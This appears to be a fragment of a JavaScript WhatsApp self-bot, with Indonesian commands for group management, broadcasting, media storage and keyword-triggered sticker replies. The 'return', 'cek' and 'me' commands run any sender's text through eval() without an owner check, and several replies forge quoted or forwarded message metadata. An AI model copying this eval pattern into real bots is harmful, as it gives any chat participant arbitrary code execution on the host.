					if (args[0].startsWith('08')) return reply('Gunakan kode bahasa kak')
					try {
					num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
					alpha.groupAdd(from, [num])
					} catch (e) {
					console.log('Error :', e)
					fakestatus('Anjim yang mau di add di private, dahlah :)')
					}
					break
			case 'admin':
					if (!isGroup) return fakestatus('```KHUSUS GRUP BRO```')
					teks = `*DAFTAR ATASAN GROUP* _${groupMetadata.subject}_\n*TOTAL* : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
					no += 1
					teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
			
			case 'tagall':
			        if (!isGroup) return fakestatus('```KHUSUS GRUP BRO```')
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
					teks += `@${mem.jid.split('@')[0]}\n`
					members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break

			case 'clearall':
			        if (!mek.key.fromMe) return fakeitem('```OWNER ONLY```')
			        anu = await alpha.chats.all()
					alpha.setMaxListeners(25)
					for (let _ of anu) {
					alpha.deleteChat(_.jid)
					}
					fakegroup('```SUKSES```')
					break
            case 'leave':
                    if (!mek.key.fromMe) return fakeitem('```OWNER ONLY```')
					setTimeout( () => {
					alpha.groupLeave (from) 
					}, 2000)
					setTimeout( () => {
					alpha.updatePresence(from, Presence.composing) 
					fakestatus('```AKU PAMIT```')
					}, 0)
					break       
           case prefix+'getpp':
				if (mek.message.extendedTextMessage != undefined){
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await alpha.getProfilePicture(mentioned[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					seer = `Nama : *${pushname}`
					thumb = await getBuffer(pic)
					anuu  = {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `${numbernye}@s.whatsapp.net`, 'remoteJid': '6289523258649-1604595598@g.us', 'quotedMessage': {"imageMessage": {"caption": `「 Bot by zeeone 」`, 'jpegThumbnail': fs.readFileSync('image/103.jpg')}}}}
                    alpha.sendMessage(from, thumb,image, anuu)
				}
				break
	case 'inspect':
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
		            if (!q) return reply('```Masukkan link groupnya```')
		            cos = args[0]
		            var net = cos.split('https://chat.whatsapp.com/')[1]
		            if (!net) return reply('pastikan itu link https://whatsapp.com/')
		            jids = []
		            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await alpha.query({ 
		            json: ["query", "invite",net],
		            expect200:true })
		            let par = `*Id* : ${id}
		${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
		*Nama Gc* : ${subject}
		*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
		*Jumlah Member* : ${size}
		${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
		*Id desc* : ${descId}
		${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
		           for ( let y of participants) {
		             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
		             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
		             }
		             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             alpha.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
		             } catch {
		             reply('Link error')
		             }
		             break
			case prefix+ 'return':
			case prefix+ 'cek':
			case prefix+ 'me':
					return alpha.sendMessage(from, JSON.stringify(eval(args.join(' '))), text, { quoted: mek})
					break
			case 'bc':
			case 'broadcast':
			case 'bcimage':
					if (!mek.key.fromMe) return fakegroup('```OWNER ONLY')
					if (args.length < 1) return reply('```TEXT?```')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek					
					bc = await alpha.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					alpha.sendMessage(_.jid, bc, image, {quoted:fkontak ,caption: `「  *BROADCAST * 」\n\n${body.slice(4)}`})
					}
					fakegroup('```SUKSESS BROADCAST```')
					} else {
					for (let _ of anu) {
						alpha.sendMessage(_.jid, `*BROADCAST* \n\n${anu}`, text, { contextInfo: { mentionedJid: [sender] }})
					 //sendMess(_.jid, `*「 Alphabot Broadcast  」*\n\n${body.slice(4)}`)
					}
					fakegroup('```SUKSESS BROADCAST```')
					}
					break
			case prefix+'buggc':
			if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					await alpha.toggleDisappearingMessages(from, 0)
					break
			case prefix+'infogc':
					alpha.updatePresence(from, Presence.composing)
					if (!isGroup) return reply(mess.only.group)
					try {
					ppimg = await alpha.getProfilePicture(from)
					} catch {
						ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
					}
					let buf = await getBuffer(ppimg)
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `*Nama grup :* ${groupName}\n*Deskripsi :* ${groupDesc}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Member :* ${groupMembers.length}`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}]`
					}
					alpha.sendMessage(from, buf, image, {quoted: mek, caption: teks})
					break
/*
]=====> STORAGE MENU <=====[
*/
	        case prefix+'addstik':
					if (!isQuotedSticker) return fakegroup('```Reply stiker nya```')
					svst = body.slice(9)
					if (!svst) return fakegroup('```Nama sticker nya apa?```')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(boij)
					setiker.push(`${svst}`)
					fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
					fs.writeFileSync('./temp/stik.json', JSON.stringify(setiker))
					fakegroup(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
					break
					
	        case prefix+'getstik':
					namastc = body.slice(9)
					try {
					result = fs.readFileSync(`./temp/stick/${namastc}.webp`)
					alpha.sendMessage(from, result, sticker,{quoted: mek})
					} catch {
					  fakegroup('Pack tidak terdaftar')
					}
					break
				
	        case prefix+'liststik':
					teks = '*Sticker list :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
					
			case prefix+'addimg':
					if (!isQuotedImage) return fakegroup('```Reply imagenya```')
					clara = body.slice(8)
					if (!clara) return fakegroup('```Nama imagenya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./temp/foto/${svst}.jpeg`, delb)
					fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`)
					break
	
			case prefix+'getimg':
					namastc = body.slice(8)
					try {
					buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
					alpha.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From Database : ${namastc}.jpeg` })
					} catch {
					  fakegroup('```Pack tidak terdaftar```')
					}
					break
			case prefix+'listimg':
					teks = '*Image list :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*`
					fakegroup(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
			case prefix+'addvid':
					if (!isQuotedVideo) return fakegroup('```Reply vidionya```')
					svst = body.slice(8)
					if (!svst) return fakegroup('```Nama vidionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
					fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`)
					break
	        case prefix+'listvid':
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}* `
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
			case prefix+'getvid':
					namastc = body.slice(8)
					try {
					buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
					alpha.sendMessage(from, buffer, video, { quoted: mek, caption: `Result From Database : ${namastc}.mp4` })
					} catch {
					  fakegroup('```Pack tidak terdaftar```')
					}
					break
			case prefix+'addvn':
					if (!isQuotedAudio) return fakegroup('```Reply vnnya```')
					svst = body.slice(7)
					if (!svst) return reply('```Nama audionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
					fakegroup( `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
					break
           case prefix+'getvn':
					namastc = body.slice(7)
					try {
					buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
					alpha.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
					} catch {
					  fakegroup('```Pack tidak terdaftar```')
					}
					break
			case prefix+'listvn':
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break            
				default:
				
				if (budy.includes("eror",'error','Eror','Error')){
					alpha.updatePresence(from, Presence.composing)
					const daieeeee = fs.readFileSync('./stik/10_1.webp');
					alpha.sendMessage(from, daieeeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Kenapa bisa error???`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("gay",'Gay','ngewe','Ngewe')){
					alpha.updatePresence(from, Presence.composing)
					const daieeee = fs.readFileSync('./stik/13.webp');
					alpha.sendMessage(from, daieeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Yg diatas gua guy`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("Sc")){
					alpha.updatePresence(from, Presence.composing)
					const daieee = fs.readFileSync('./stik/1_1.webp');
					alpha.sendMessage(from, daieee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Dasar pelit`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("sc")){
					alpha.updatePresence(from, Presence.composing)
					const daeee = fs.readFileSync('./stik/1_1.webp');
					alpha.sendMessage(from, daeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Dasar pelit`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("Ajg")){
					alpha.updatePresence(from, Presence.composing)
					const daee = fs.readFileSync('./stik/11.webp');
					alpha.sendMessage(from, daee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Bapak² Toxic Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("ajg")){
					alpha.updatePresence(from, Presence.composing)
					const deie = fs.readFileSync('./stik/11.webp');
					alpha.sendMessage(from, deie, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Bapak² Toxic Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("anjg")){
					alpha.updatePresence(from, Presence.composing)
					const deee = fs.readFileSync('./stik/11.webp');
					alpha.sendMessage(from, deee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Bapak² Toxic Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("asu")){
					alpha.updatePresence(from, Presence.composing)
					const dee = fs.readFileSync('./stik/11.webp');
					alpha.sendMessage(from, dee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Bapak² Toxic Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes(`${setting.ownername}`)){
					alpha.updatePresence(from, Presence.composing)
					const dd = fs.readFileSync('./stik/15.webp');
					alpha.sendMessage(from, dd, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Apasih jamet ngetag gua`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("epep","ff")){
					alpha.updatePresence(from, Presence.composing)
					const ddd = fs.readFileSync('./stik/12.webp');
					alpha.sendMessage(from, ddd, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Dahlah:v`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("anjing")){
					alpha.updatePresence(from, Presence.composing)
					const de = fs.readFileSync('./stik/3.webp');
					alpha.sendMessage(from, de, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Mastah Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("Mastah")){
					alpha.updatePresence(from, Presence.composing)
					const d = fs.readFileSync('./stik/14.webp');
					alpha.sendMessage(from, d, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Mastah Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("mastah")){
					alpha.updatePresence(from, Presence.composing)
					const d = fs.readFileSync('./stik/14.webp');
					alpha.sendMessage(from, d, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Mastah Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
if (budy.startsWith('x')){
try {
if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  

	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'aqua'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
